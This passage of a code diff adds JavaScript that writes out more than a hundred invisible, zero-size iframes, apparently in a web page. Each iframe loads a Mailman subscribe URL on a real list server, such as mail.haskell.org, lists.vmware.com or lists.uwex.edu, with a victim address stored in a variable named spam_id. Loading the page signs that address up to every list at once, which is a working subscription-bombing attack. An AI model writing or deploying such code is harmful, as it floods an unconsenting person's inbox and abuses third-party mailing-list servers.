+          "<iframe frameborder='0' src='http://lists.lugod.org/mailman/subscribe/vox-announce?email=" +
+            spam_id +
+            "&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://www.skiifwrald.com/mailman/subscribe/alertmailinglist_skiifwrald.com?email=" +
+            spam_id +
+            "&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://lists.umanitoba.ca/mailman/subscribe/student-weekly-bannatyne?email=" +
+            spam_id +
+            "&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://lists.umanitoba.ca/mailman/subscribe/student-weekly-fort-garry?email=" +
+            spam_id +
+            "&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://lists.vmware.com/mailman/subscribe/fusion-enterprise?email=" +
+            spam_id +
+            "&fullname=&pw=Ab123456789&pw-conf=Ab123456789&digest=1&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://lists.vmware.com/mailman/subscribe/mailman?email=" +
+            spam_id +
+            "&fullname=&pw=Ab123456789&pw-conf=Ab123456789&digest=1&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://lists.vmware.com/mailman/subscribe/security-announce?email=" +
+            spam_id +
+            "&fullname=&pw=Ab123456789&pw-conf=Ab123456789&digest=1&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://lists.vmware.com/mailman/subscribe/solutionproviderroundtable?email=" +
+            spam_id +
+            "&fullname=&pw=Ab123456789&pw-conf=Ab123456789&digest=1&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://lists.vmware.com/mailman/subscribe/springsource-announce?email=" +
+            spam_id +
+            "&fullname=&pw=Ab123456789&pw-conf=Ab123456789&digest=1&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://lists.vmware.com/mailman/subscribe/support-alerts?email=" +
+            spam_id +
+            "&fullname=&pw=Ab123456789&pw-conf=Ab123456789&digest=1&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://lists.vmware.com/mailman/subscribe/te-banned?email=" +
+            spam_id +
+            "&fullname=&pw=Ab123456789&pw-conf=Ab123456789&digest=1&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://lists.vmware.com/mailman/subscribe/te-contributors?email=" +
+            spam_id +
+            "&fullname=&pw=Ab123456789&pw-conf=Ab123456789&digest=1&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://lists.vmware.com/mailman/subscribe/te-stacey?email=" +
+            spam_id +
+            "&fullname=&pw=Ab123456789&pw-conf=Ab123456789&digest=1&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://lists.vmware.com/mailman/subscribe/te-testlist?email=" +
+            spam_id +
+            "&fullname=&pw=Ab123456789&pw-conf=Ab123456789&digest=1&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://lists.vmware.com/mailman/subscribe/te-webmaster?email=" +
+            spam_id +
+            "&fullname=&pw=Ab123456789&pw-conf=Ab123456789&digest=1&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://lists.vmware.com/mailman/subscribe/testlistdl2017?email=" +
+            spam_id +
+            "&fullname=&pw=Ab123456789&pw-conf=Ab123456789&digest=1&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://lists.vmware.com/mailman/subscribe/vmwaretest?email=" +
+            spam_id +
+            "&fullname=&pw=Ab123456789&pw-conf=Ab123456789&digest=1&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://chilli.nosignal.org/cgi-bin/mailman/subscribe/curry?email=" +
+            spam_id +
+            "&fullname=&pw=Ab123456789&pw-conf=Ab123456789&digest=1&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://chilli.nosignal.org/cgi-bin/mailman/subscribe/flow-spec?email=" +
+            spam_id +
+            "&fullname=&pw=Ab123456789&pw-conf=Ab123456789&digest=1&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://chilli.nosignal.org/cgi-bin/mailman/subscribe/gerty-users?email=" +
+            spam_id +
+            "&fullname=&pw=Ab123456789&pw-conf=Ab123456789&digest=1&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://chilli.nosignal.org/cgi-bin/mailman/subscribe/i-dev?email=" +
+            spam_id +
+            "&fullname=&pw=Ab123456789&pw-conf=Ab123456789&digest=1&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://chilli.nosignal.org/cgi-bin/mailman/subscribe/li?email=d" +
+            spam_id +
+            "&fullname=&pw=Ab123456789&pw-conf=Ab123456789&digest=1&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://chilli.nosignal.org/cgi-bin/mailman/subscribe/mailop?email=" +
+            spam_id +
+            "&fullname=&pw=Ab123456789&pw-conf=Ab123456789&digest=1&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://chilli.nosignal.org/cgi-bin/mailman/subscribe/manops?email=" +
+            spam_id +
+            "&fullname=&pw=Ab123456789&pw-conf=Ab123456789&digest=1&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://chilli.nosignal.org/cgi-bin/mailman/subscribe/nogstaff?email=" +
+            spam_id +
+            "&fullname=&pw=Ab123456789&pw-conf=Ab123456789&digest=1&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://chilli.nosignal.org/cgi-bin/mailman/subscribe/potty?ail=" +
+            spam_id +
+            "&fullname=&pw=Ab123456789&pw-conf=Ab123456789&digest=1&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://chilli.nosignal.org/cgi-bin/mailman/subscribe/uknot?email=" +
+            spam_id +
+            "&fullname=&pw=Ab123456789&pw-conf=Ab123456789&digest=1&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://chilli.nosignal.org/cgi-bin/mailman/subscribe/uknot-jobs?email=" +
+            spam_id +
+            "&fullname=&pw=Ab123456789&pw-conf=Ab123456789&digest=1&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://mail.haskell.org/cgi-bin/mailman/subscribe/arch-haskell?email=" +
+            spam_id +
+            "&fullname=&pw=Ab123456789&pw-conf=Ab123456789&digest=1&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://mail.haskell.org/cgi-bin/mailman/subscribe/beginners?email=" +
+            spam_id +
+            "&fullname=&pw=Ab123456789&pw-conf=Ab123456789&digest=1&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://mail.haskell.org/cgi-bin/mailman/subscribe/blobs?email=" +
+            spam_id +
+            "&fullname=&pw=Ab123456789&pw-conf=Ab123456789&digest=1&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://mail.haskell.org/cgi-bin/mailman/subscribe/c2hs?email=" +
+            spam_id +
+            "&fullname=&pw=Ab123456789&pw-conf=Ab123456789&digest=1&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://mail.haskell.org/cgi-bin/mailman/subscribe/cabal-devel?email=" +
+            spam_id +
+            "&fullname=&pw=Ab123456789&pw-conf=Ab123456789&digest=1&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://mail.haskell.org/cgi-bin/mailman/subscribe/cvs-hugs?email=" +
+            spam_id +
+            "&fullname=&pw=Ab123456789&pw-conf=Ab123456789&digest=1&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://mail.haskell.org/cgi-bin/mailman/subscribe/cvs-nhc98?email=" +
+            spam_id +
+            "&fullname=&pw=Ab123456789&pw-conf=Ab123456789&digest=1&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://mail.haskell.org/cgi-bin/mailman/subscribe/data-haskell?email=" +
+            spam_id +
+            "&fullname=&pw=Ab123456789&pw-conf=Ab123456789&digest=1&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://mail.haskell.org/cgi-bin/mailman/subscribe/database-devel?email=" +
+            spam_id +
+            "&fullname=&pw=Ab123456789&pw-conf=Ab123456789&digest=1&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://mail.haskell.org/cgi-bin/mailman/subscribe/fedora-haskell?email=" +
+            spam_id +
+            "&fullname=&pw=Ab123456789&pw-conf=Ab123456789&digest=1&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://mail.haskell.org/cgi-bin/mailman/subscribe/ffi?email=" +
+            spam_id +
+            "&fullname=&pw=Ab123456789&pw-conf=Ab123456789&digest=1&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://mail.haskell.org/cgi-bin/mailman/subscribe/fieldtrip?email=" +
+            spam_id +
+            "&fullname=&pw=Ab123456789&pw-conf=Ab123456789&digest=1&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://mail.haskell.org/cgi-bin/mailman/subscribe/freebsd-haskell?email=" +
+            spam_id +
+            "&fullname=&pw=Ab123456789&pw-conf=Ab123456789&digest=1&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://mail.haskell.org/cgi-bin/mailman/subscribe/generics?email=" +
+            spam_id +
+            "&fullname=&pw=Ab123456789&pw-conf=Ab123456789&digest=1&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://mail.haskell.org/cgi-bin/mailman/subscribe/ghc-builds?email=" +
+            spam_id +
+            "&fullname=&pw=Ab123456789&pw-conf=Ab123456789&digest=1&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://mail.haskell.org/cgi-bin/mailman/subscribe/ghc-commits?email=" +
+            spam_id +
+            "&fullname=&pw=Ab123456789&pw-conf=Ab123456789&digest=1&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://mail.haskell.org/cgi-bin/mailman/subscribe/ghc-devops-groups?email=" +
+            spam_id +
+            "&fullname=&pw=Ab123456789&pw-conf=Ab123456789&digest=1&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://mail.haskell.org/cgi-bin/mailman/subscribe/ghc-devs?email=" +
+            spam_id +
+            "&fullname=&pw=Ab123456789&pw-conf=Ab123456789&digest=1&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://mail.haskell.org/cgi-bin/mailman/subscribe/ghc-steering-committee?email=" +
+            spam_id +
+            "&fullname=&pw=Ab123456789&pw-conf=Ab123456789&digest=1&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://mail.haskell.org/cgi-bin/mailman/subscribe/ghc-tickets?email=" +
+            spam_id +
+            "&fullname=&pw=Ab123456789&pw-conf=Ab123456789&digest=1&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://mail.haskell.org/cgi-bin/mailman/subscribe/glasgow-haskell-users?email=" +
+            spam_id +
+            "&fullname=&pw=Ab123456789&pw-conf=Ab123456789&digest=1&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://mail.haskell.org/cgi-bin/mailman/subscribe/gui?email=" +
+            spam_id +
+            "&fullname=&pw=Ab123456789&pw-conf=Ab123456789&digest=1&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://mail.haskell.org/cgi-bin/mailman/subscribe/hackathon?email=" +
+            spam_id +
+            "&fullname=&pw=Ab123456789&pw-conf=Ab123456789&digest=1&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://mail.haskell.org/cgi-bin/mailman/subscribe/haskell?email=" +
+            spam_id +
+            "&fullname=&pw=Ab123456789&pw-conf=Ab123456789&digest=1&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://mail.haskell.org/cgi-bin/mailman/subscribe/haskell-br?email=" +
+            spam_id +
+            "&fullname=&pw=Ab123456789&pw-conf=Ab123456789&digest=1&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://mail.haskell.org/cgi-bin/mailman/subscribe/haskell-cafe?email=" +
+            spam_id +
+            "&fullname=&pw=Ab123456789&pw-conf=Ab123456789&digest=1&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://mail.haskell.org/cgi-bin/mailman/subscribe/haskell-community?email=" +
+            spam_id +
+            "&fullname=&pw=Ab123456789&pw-conf=Ab123456789&digest=1&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://mail.haskell.org/cgi-bin/mailman/subscribe/haskell-fr?email=" +
+            spam_id +
+            "&fullname=&pw=Ab123456789&pw-conf=Ab123456789&digest=1&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://mail.haskell.org/cgi-bin/mailman/subscribe/haskell-fr?email=" +
+            spam_id +
+            "&fullname=&pw=Ab123456789&pw-conf=Ab123456789&digest=1&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://mail.haskell.org/cgi-bin/mailman/subscribe/haskell-i18n?email=" +
+            spam_id +
+            "&fullname=&pw=Ab123456789&pw-conf=Ab123456789&digest=1&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://mail.haskell.org/cgi-bin/mailman/subscribe/haskell-prime?email=" +
+            spam_id +
+            "&fullname=&pw=Ab123456789&pw-conf=Ab123456789&digest=1&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://mail.haskell.org/cgi-bin/mailman/subscribe/haskelldoc?email=" +
+            spam_id +
+            "&fullname=&pw=Ab123456789&pw-conf=Ab123456789&digest=1&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://mail.haskell.org/cgi-bin/mailman/subscribe/hat?email=" +
+            spam_id +
+            "&fullname=&pw=Ab123456789&pw-conf=Ab123456789&digest=1&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://mail.haskell.org/cgi-bin/mailman/subscribe/helium?email=" +
+            spam_id +
+            "&fullname=&pw=Ab123456789&pw-conf=Ab123456789&digest=1&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://mail.haskell.org/cgi-bin/mailman/subscribe/hopengl?email=" +
+            spam_id +
+            "&fullname=&pw=Ab123456789&pw-conf=Ab123456789&digest=1&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://mail.haskell.org/cgi-bin/mailman/subscribe/hugs-bugs?email=" +
+            spam_id +
+            "&fullname=&pw=Ab123456789&pw-conf=Ab123456789&digest=1&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://mail.haskell.org/cgi-bin/mailman/subscribe/hug-users?email=" +
+            spam_id +
+            "&fullname=&pw=Ab123456789&pw-conf=Ab123456789&digest=1&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://mail.haskell.org/cgi-bin/mailman/subscribe/iphone?email=" +
+            spam_id +
+            "&fullname=&pw=Ab123456789&pw-conf=Ab123456789&digest=1&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://mail.haskell.org/cgi-bin/mailman/subscribe/jhc?email=" +
+            spam_id +
+            "&fullname=&pw=Ab123456789&pw-conf=Ab123456789&digest=1&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://mail.haskell.org/cgi-bin/mailman/subscribe/libraries?email=" +
+            spam_id +
+            "&fullname=&pw=Ab123456789&pw-conf=Ab123456789&digest=1&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://mail.haskell.org/cgi-bin/mailman/subscribe/mailman?email=" +
+            spam_id +
+            "&fullname=&pw=Ab123456789&pw-conf=Ab123456789&digest=1&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://mail.haskell.org/cgi-bin/mailman/subscribe/nhc-bugs?email=" +
+            spam_id +
+            "&fullname=&pw=Ab123456789&pw-conf=Ab123456789&digest=1&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://mail.haskell.org/cgi-bin/mailman/subscribe/nhc-users?email=" +
+            spam_id +
+            "&fullname=&pw=Ab123456789&pw-conf=Ab123456789&digest=1&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://mail.haskell.org/cgi-bin/mailman/subscribe/numeric?email=" +
+            spam_id +
+            "&fullname=&pw=Ab123456789&pw-conf=Ab123456789&digest=1&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://mail.haskell.org/cgi-bin/mailman/subscribe/reactive?email=" +
+            spam_id +
+            "&fullname=&pw=Ab123456789&pw-conf=Ab123456789&digest=1&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://mail.haskell.org/cgi-bin/mailman/subscribe/template-haskell?email=" +
+            spam_id +
+            "&fullname=&pw=Ab123456789&pw-conf=Ab123456789&digest=1&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://mail.haskell.org/cgi-bin/mailman/subscribe/timber?email=" +
+            spam_id +
+            "&fullname=&pw=Ab123456789&pw-conf=Ab123456789&digest=1&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://mail.haskell.org/cgi-bin/mailman/subscribe/web-devel?email=" +
+            spam_id +
+            "&fullname=&pw=Ab123456789&pw-conf=Ab123456789&digest=1&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://mail.haskell.org/cgi-bin/mailman/subscribe/wikibook?email=" +
+            spam_id +
+            "&fullname=&pw=Ab123456789&pw-conf=Ab123456789&digest=1&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://mail.haskell.org/cgi-bin/mailman/subscribe/xmonad?email=" +
+            spam_id +
+            "&fullname=&pw=Ab123456789&pw-conf=Ab123456789&digest=1&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://mail.haskell.org/cgi-bin/mailman/subscribe/yhc?email=" +
+            spam_id +
+            "&fullname=&pw=Ab123456789&pw-conf=Ab123456789&digest=1&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://place.org/cgi-bin/mailman/subscribe/aow?email=" +
+            spam_id +
+            "&fullname=&pw=Ab123456789&pw-conf=Ab123456789&digest=1&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://place.org/cgi-bin/mailman/subscribe/av-games?email=" +
+            spam_id +
+            "&fullname=&pw=Ab123456789&pw-conf=Ab123456789&digest=1&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://place.org/cgi-bin/mailman/subscribe/jugglefest-announce?email=" +
+            spam_id +
+            "&fullname=&pw=Ab123456789&pw-conf=Ab123456789&digest=1&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://place.org/cgi-bin/mailman/subscribe/sundaynightgames?email=" +
+            spam_id +
+            "&fullname=&pw=Ab123456789&pw-conf=Ab123456789&digest=1&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://place.org/cgi-bin/mailman/subscribe/tjs?email=" +
+            spam_id +
+            "&fullname=&pw=Ab123456789&pw-conf=Ab123456789&digest=1&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://place.org/cgi-bin/mailman/subscribe/tjs-web?email=" +
+            spam_id +
+            "&fullname=&pw=Ab123456789&pw-conf=Ab123456789&digest=1&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://mailman.ucsd.edu/mailman/subscribe/elcueteteam-l?email=" +
+            spam_id +
+            "&fullname=&pw=Ab123456789&pw-conf=Ab123456789&digest=1&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://mailman.ucsd.edu/mailman/subscribe/haosulab-l?email=" +
+            spam_id +
+            "&fullname=&pw=Ab123456789&pw-conf=Ab123456789&digest=1&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://mailman.ucsd.edu/mailman/subscribe/po-journalclub-l?email=" +
+            spam_id +
+            "&fullname=&pw=Ab123456789&pw-conf=Ab123456789&digest=1&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://mailman.ucsd.edu/mailman/subscribe/studentanalytics-cop-l?email=" +
+            spam_id +
+            "&fullname=&pw=Ab123456789&pw-conf=Ab123456789&digest=1&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://coral.aoml.noaa.gov/mailman/subscribe/cdhc?email=" +
+            spam_id +
+            "&fullname=&pw=Ab123456789&pw-conf=Ab123456789&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://coral.aoml.noaa.gov/mailman/subscribe/coral-list?email=" +
+            spam_id +
+            "&fullname=&pw=Ab123456789&pw-conf=Ab123456789&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='https://lists.uwex.edu/mailman/subscribe/4-h-club-workteam?email=" +
+            spam_id +
+            "&fullname=&pw=Ab123456789&pw-conf=Ab123456789&digest=1&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='https://lists.uwex.edu/mailman/subscribe/4-h-club-workteam?email=" +
+            spam_id +
+            "&fullname=&pw=Ab123456789&pw-conf=Ab123456789&digest=1&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='https://lists.uwex.edu/mailman/subscribe/3dworkgroup?email=" +
+            spam_id +
+            "&fullname=&pw=Ab123456789&pw-conf=Ab123456789&digest=1&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='https://lists.uwex.edu/mailman/subscribe/4-h-club-workteam?email=" +
+            spam_id +
+            "&fullname=&pw=Ab123456789&pw-conf=Ab123456789&digest=1&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='https://lists.uwex.edu/mailman/subscribe/4-h-liaisons?email=" +
+            spam_id +
+            "&fullname=&pw=Ab123456789&pw-conf=Ab123456789&digest=1&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='https://lists.uwex.edu/mailman/subscribe/4h-all-list?email=" +
+            spam_id +
+            "&fullname=&pw=Ab123456789&pw-conf=Ab123456789&digest=1&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='https://lists.uwex.edu/mailman/subscribe/4h-county-list?email=" +
+            spam_id +
+            "&fullname=&pw=Ab123456789&pw-conf=Ab123456789&digest=1&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='https://lists.uwex.edu/mailman/subscribe/4h-county-support?email=" +
+            spam_id +
+            "&fullname=&pw=Ab123456789&pw-conf=Ab123456789&digest=1&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='https://lists.uwex.edu/mailman/subscribe/4h-friends?email=" +
+            spam_id +
+            "&fullname=&pw=Ab123456789&pw-conf=Ab123456789&digest=1&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='https://lists.uwex.edu/mailman/subscribe/4h-northcentral-list?email=" +
+            spam_id +
+            "&fullname=&pw=Ab123456789&pw-conf=Ab123456789&digest=1&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='https://lists.uwex.edu/mailman/subscribe/4h-county-friends?email=" +
+            spam_id +
+            "&fullname=&pw=Ab123456789&pw-conf=Ab123456789&digest=1&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='https://lists.uwex.edu/mailman/subscribe/4h-northwest-list?email=" +
+            spam_id +
+            "&fullname=&pw=Ab123456789&pw-conf=Ab123456789&digest=1&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='https://lists.uwex.edu/mailman/subscribe/4h-southwest-list?email=" +
+            spam_id +
+            "&fullname=&pw=Ab123456789&pw-conf=Ab123456789&digest=1&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='https://lists.uwex.edu/mailman/subscribe/4h-state-list?email=" +
+            spam_id +
+            "&fullname=&pw=Ab123456789&pw-conf=Ab123456789&digest=1&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='https://lists.uwex.edu/mailman/subscribe/4h-volunteer-impact?email=" +
+            spam_id +
+            "&fullname=&pw=Ab123456789&pw-conf=Ab123456789&digest=1&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='https://lists.uwex.edu/mailman/subscribe/4hafterschoolvista?email=" +
+            spam_id +
+            "&fullname=&pw=Ab123456789&pw-conf=Ab123456789&digest=1&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='https://lists.uwex.edu/mailman/subscribe/abc-list?email=" +
+            spam_id +
+            "&fullname=&pw=Ab123456789&pw-conf=Ab123456789&digest=1&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='https://lists.uwex.edu/mailman/subscribe/aed-list?email=" +
+            spam_id +
+            "&fullname=&pw=Ab123456789&pw-conf=Ab123456789&digest=1&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='https://lists.uwex.edu/mailman/subscribe/ag-all-list?email=" +
+            spam_id +
+            "&fullname=&pw=Ab123456789&pw-conf=Ab123456789&digest=1&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='https://lists.uwex.edu/mailman/subscribe/ag-county-friends?email=" +
+            spam_id +
+            "&fullname=&pw=Ab123456789&pw-conf=Ab123456789&digest=1&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='https://lists.uwex.edu/mailman/subscribe/ag-county-list?email=" +
+            spam_id +
+            "&fullname=&pw=Ab123456789&pw-conf=Ab123456789&digest=1&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='https://lists.uwex.edu/mailman/subscribe/aed-list?email=" +
+            spam_id +
